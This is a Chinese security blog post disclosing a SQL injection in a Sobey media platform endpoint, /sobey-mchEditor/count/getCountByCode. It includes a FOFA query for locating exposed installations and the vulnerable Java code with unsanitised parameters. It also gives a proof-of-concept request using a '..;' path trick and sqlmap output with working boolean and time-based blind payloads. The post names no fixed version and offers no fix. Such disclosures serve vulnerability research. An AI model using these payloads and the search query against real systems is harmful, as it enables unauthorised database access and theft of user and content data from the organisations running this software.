---
title: "索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-getCountByCode-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditorcountgetcountbycode-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/25 20:23
* 641浏览
* [0评论](#comment)
* 50分钟阅读

深入探索

网络安全会议

物流软件安全

恶意软件分析工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/count/getCountByCode 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入防护

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`count/getCountByCode`的实现逻辑

```
@RequestMapping(
    value = {"/getCountByCode"},
    method = {RequestMethod.GET}
)
public Response getCountByCode(@RequestParam(value = "userCode",required = false) String userCode, @RequestParam(value = "channelCode",required = false) String channelCode, @RequestParam(value = "status",required = false) String status, @RequestParam(value = "time",defaultValue = "7") int time, @RequestParam(value = "orderType",required = false) String orderType, @RequestParam(value = "createDate",required = false) String createDate) {
    Response response = new Response();
    StringBuffer wzSql = new StringBuffer(" select a.createUserCode userCode,MAX(a.createusername) userName,count(1) website ,0 sina,0 wechat from zcnarticle a WHERE a.type='1' ");
    StringBuffer wbSql = new StringBuffer(" select b.createUserCode userCode,MAX(b.createusername) userName,0 website,count(1) sina,0 wechat from zcnarticle b WHERE b.type='6' ");
    StringBuffer wxSql = new StringBuffer(" SELECT c.createUserCode userCode,MAX(c.createusername) userName,0 website,0 sina,count(1) wechat from zcnwxarticle c where 1=1 ");
    StringBuffer userCodeSql = new StringBuffer();
    if (StringUtil.isNotEmpty(userCode)) {
        String[] channels = userCode.split(",");

        for(int i = 0; i < channels.length; ++i) {
            userCodeSql.append("'").append(channels[i]).append("'");
            if (i != channels.length - 1) {
                userCodeSql.append(",");
            }
        }

        wzSql.append(" and a.createUserCode in ( ").append(userCodeSql.toString()).append(" ) ");
        wbSql.append(" and b.createUserCode in ( ").append(userCodeSql.toString()).append(" )");
        wxSql.append(" and c.createUserCode in ( ").append(userCodeSql.toString()).append(" )");
    }

    if (StringUtil.isNotEmpty(status)) {
        wzSql.append(" and a.status = " + status);
        wbSql.append(" and b.status = " + status);
        wxSql.append(" and c.status = " + status);
    }

    if (StringUtil.isNotEmpty(createDate)) {
        wzSql.append(" and a.createdate > '" + createDate + "' ");
        wbSql.append(" and b.createdate > '" + createDate + "' ");
        wxSql.append(" and c.createdate > '" + createDate + "' ");
    }

    wzSql.append(" GROUP BY a.createUserCode ");
    wbSql.append(" GROUP BY b.createUserCode ");
    wxSql.append(" GROUP BY c.createUserCode ");
    StringBuffer sql = new StringBuffer("SELECT aa.userCode,aa.userName,sum(website) website,sum(sina) sina,sum(wechat) wechat FROM (");
    sql.append(wzSql).append(" UNION ALL  ").append(wbSql).append(" UNION ALL ").append(wxSql).append(" ) aa GROUP BY aa.userCode  ");
```

参数**userCode**、**status**和**createDate**，均是无任何过滤或校验处理，被直接拼接到wzSql这个sql语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01'SQLI_POC&orderType=1&status=1&userCode=1&siteCode=1&token=1 HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞](images/img-001-185ffe4f71a3.webp)](https://image.mrxn.net/c30819ef0c95428b983ee0c2975aae9a.webp)

布尔注入获取所有usercode、username、website、sina以及wechat等字段信息。

代码安全审计

同样也支持延时注入

[![索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞](images/img-002-6d75578ed97c.webp)](https://image.mrxn.net/cbafab9a714f4587ac4f72d3fd06809c.webp)

[sqlmap](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #2* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01&orderType=1&status=1 OR NOT 3129=3129&userCode=1&siteCode=1&token=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01&orderType=1&status=1 AND (SELECT 7203 FROM (SELECT(SLEEP(5)))Xjgf)&userCode=1&siteCode=1&token=1

Parameter: #3* (URI)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01&orderType=1&status=1&userCode=1' RLIKE (SELECT (CASE WHEN (3997=3997) THEN 1 ELSE 0x28 END)) AND 'eKym'='eKym&siteCode=1&token=1

Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01' OR NOT 6665=6665 AND 'puIy'='puIy&orderType=1&status=1&userCode=1&siteCode=1&token=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01' AND (SELECT 6067 FROM (SELECT(SLEEP(5)))ZuGP) AND 'SlgF'='SlgF&orderType=1&status=1&userCode=1&siteCode=1&token=1
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞](https://mrxn.net/jswz/sobey-getCountByCode-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-getCountByCode-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞扫描服务

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKMklEQVR4Aeybi3rcuA6D+/f933lPYAYSR6I1zm2cs6v9yoICQMoRrSTNtn///Pnzz1fjnw/+5/1ymbmM1s15Lfws5zqh+iiUfzRUl+Oj9Wd+DeRN279+ywm0gbxN+89HovoAgD/wGPZB581VmJ+h0lecaysPxP5Zg+BcJ8y6c/EKr5+hvB+J3K8NJJM7v+8EpoFAvDVQ4+pRq7cCok9VB6EB7XZC5yBy94VYA1W7xgHtprq2QhfA2m9f7mFuhdD7wpxXtdNAKtPmXncCeyCvO+tLO/34QHzNq6exJoS40pXPnHwOcxB10NEe4ejzWih9DOh94DxX/U/Ejw/kJx7639zz1wxkfFO1Hg8e+hs7ankN3QeRZ33MITzAKD2s9UyOB+EbFz8zkG98wP9aqz2QXzbxaSC+kme4en6gff8Pkduf+5mD8ACmSgSOvqX4hPS+lQ2irz1C+5SPAeEHbFviWD+uq+JpIJVpc687gTYQ4HgL4RquHjG/CRD9Kv9HfbmHa59xWf9sDvExeE8hBFf1hNDgGuYebSCZ3Pl9J7AHct/Zlzv/1fX7aoydoV/VUXvFOn883s+c1xmhP6990Dl7oXP2WfP6q7hviE/0l+ClgUB/M+A899tRfWzQ6yrdHHSf+0Fw9pwhhA862gudg8itPUM/R/bBYw+INXTM/iqH8Gbt0kBywY35f2LrNhCIacGM1Un4rcm48lVaxeV+EM9iX6Vl7qrPNfZnhMc9s+a6jFkfc4he0DF73Ae63gaSjTu/7wT2QO47+3LnvxDXxaqvkdBcRvEKiDqYMfshdNU4rENogKkHtN8ItJ8m2AjXOPuvovcUQuyRayE4CJTvSuQeVb5vSHUqN3LtD4Z+BoiJA6ba3wjRGwAcb6nyMVpBSuxJVOtXcRD9gSYDp3u6v9AFyh3mVmhvRog9gVYKHM8BNM4JcKrJA6ErX8W+IavTuUHbA7nh0FdbfviLuptBXEHAVMN89U0CX77SsO7hfWHt8zMZYe1334yuNWYNop81oXXlY1gT7hsyns7N6zYQTUdRPQ/ExKH/lU95Ha4Z1+IhapU7YOaqWvutZYS5h/0fxapvxUHsCUxbANNnAFhz0HWIvA1k2mETt5zAHsgtx36+6af/HAJxxYCpOzBd3/wpYCo4IaD3AUoXsNzL+0L4chNrmaty+ypc+Vda7pV9+4bk0/gF+fLbXk8xP6e5jFlXXmkQbyggy6Vwn5XZHuEV38ojTX0UQLt5ELl0BwQn7xgwa657hvuGPDuhF+t7IC8+8GfbXRoIxBUEWj/g9EpD11yQr7W5q+ja7K846zDvb61CWPurvSqu6m0OYg+vhRCcewkvDUTFOz50Ap82T9/25k4QE6w4TXMMCH/mc+2YV77MQfRzHcQaMHUZgeNG5wKYOeur57BHCNEDOopXQOfcDzonjwI6t2+ITuQXxfRtb/Vsnm5G6FOFyK1DrKH/7KvqC90Hcz7WuL8Qwp89EJx0R9aVQ3gALU8DOG4UrD+Gs33U2JpQa4XyMcQ79g3xSfwS3AP5JYPwYywH4qsF/fq60FrGSjMHvUeucW6f1xmh10Lk1l0nrDgIv/TPBkQP6Dj28t7CUdMaolb5KpYDWRVu7WdOYDkQmKcKwUFHPxoE53VGvTkOOPdBaEArd10j3hKgfdGF8/zNevyqepjLeJjffqu4N3r6BbF3FlybOecQfuhov3A5EDfZ+LoT2AN53Vlf2qn9SR36FYLIdYUUuZPWY0D4s2+Vux6iDmh2a0KTwPHpyWuh9DHEKzKvtQKix0oDZJ0i1zgfTcDxjFCj6yqEXrNvyHiyN6/bn9Q9ufw8EJOzJoTgoKNrpCu8FkL3QeTiFfI6tB4Dwl95ILSx5mztHhB10PGsZsVD1LtvxlXdM23fkGcn9GJ9D+TFB/5su2kg+eo5r5pYE446xHWG+gdz0HWIXH0UuZfWCgjPSgOyfJqr3xjZDExfnK1D10bOa6H7K3dA1HothJmbBiLjjvtOoH3b60eAmBrUWPn8RkDUeC20X7mj4iBqoaN9RtcLzT1DeRXQ+8JjnnvIq8icc/EOcxVC9LdXWPnMSXfsG+JT+SXYvu2FeaqeWkY/d+Ygaq1lhFlzbfZVnHVrEL0AS+1fY8nTyJQAx9cEU/KNYS1j9mT+LIfYB2gW4Ngb+tdS6JyN0LkbbogfY2N1Ansg1ancyLWB+IrmZ4F+lSBy6xBr6NfRPWDWoHNVD3MZodfA4z7Z59z7ey00Z4TeU/oYEPrIn63dN+sVZ91aRmvCNhAtdtx/AtNAIN4QoD1dnmaVA+2LF9DqcpLrMu8cOHpUPnP2ZoSogxrthdDdSwgzJ14BoQFucTwfcKBJeFybHxHOfdrPMQ1kbLTXrz2BPZDXnvfT3ZYD8TXKXSCuHnTMunLXCbU+C+kOe6D3HTV7hBA+ezJK/0hA9IKOVf1qj6xB9Mmc86pv5pYDycadv+YE2kBgnioEVz2KJ14hRB10zD2g8xC5+1Q+cxBewFSJ7iW0QbnC64zix8g68PCFXNroh/AAko8AjjrgWJ/9BjRfG8iZ+f+F/7c85x7IL5tk+/G7ryD062OuembovlF3ndAanPvtEarGobUCota8UPyVgKiFwKoGQgOarD0cjUwJ0D7NwPOfIsCjH0jderpvSD+LX5FNA/FbIQQe3gJ4fBPkUXznRwJ9z+/oq+dTXO0FfX+I/GrtFZ+exWG/18JpIDZtvOcE9kDuOffTXaf/Y3jqfBcgrjF0fJfapzevM+o6Osx7LYToZy2jdAWEB/qnzuxzDt0HkateYY9Q67OQ7rDH6woh9gEqueSA48yyuG9IPo1fkE/f9uZn8pvxDHPNldz9srfirMP8JkFw0NF+98oI3QeR2w+xho7WhNB5iFy8Iu8x5tLHgKiHfsuhc/uGjCf2sH79YvoaAn1acC0fHxt6nd8a6Jz9MHP2V+g6YaVD7weRy6uo/OLPIvvtqThrEPsBpj6F+4Z86th+rmgP5OfO9lOd20DydbySf2q39yLg+HYv7wPBvVueAlzzQ/jgHPNmfqaKg94j68pdJ9T6LKQ7IPp5LWwDOWuw+deewDQQiKlBjR99PIg+VR2EBlTycYuAhtmkt0lRceLPIvudZy/EftaeIYQfZnxWax167TQQmzbecwJ7IPec++mu3zoQX/3T3d6F7/BBv+YQ+Xv79ikOggcslQi0GhugcxC5tYz+WDJarzhrZ/itAznbZPOPJ7Ba/fhA8lvi3A/kdUaItxGw7eHfgGSv8mZ6S4DjTRc/BoT2Zlv+cl02rTiY+1b+3G+V//hAVptvbT6BPZD5TG5lpoH4up3hlafNtSs/xHWHjrkWOg88tAKOT08P5PsCQoOOue+Yv5c9hVwH0bsqgllzbeXP3DSQLO789SfQBgIxVbiGq0eF3sM+mDm/NRntrxDmHpWv4iBqK+0r+7sWoj/QtgCOWwwdm5gS9xC2gSR9pzeewB7IjYdfbf0/AAAA//9i5JslAAAABklEQVQDACChBK0C4elWAAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-getCountByCode-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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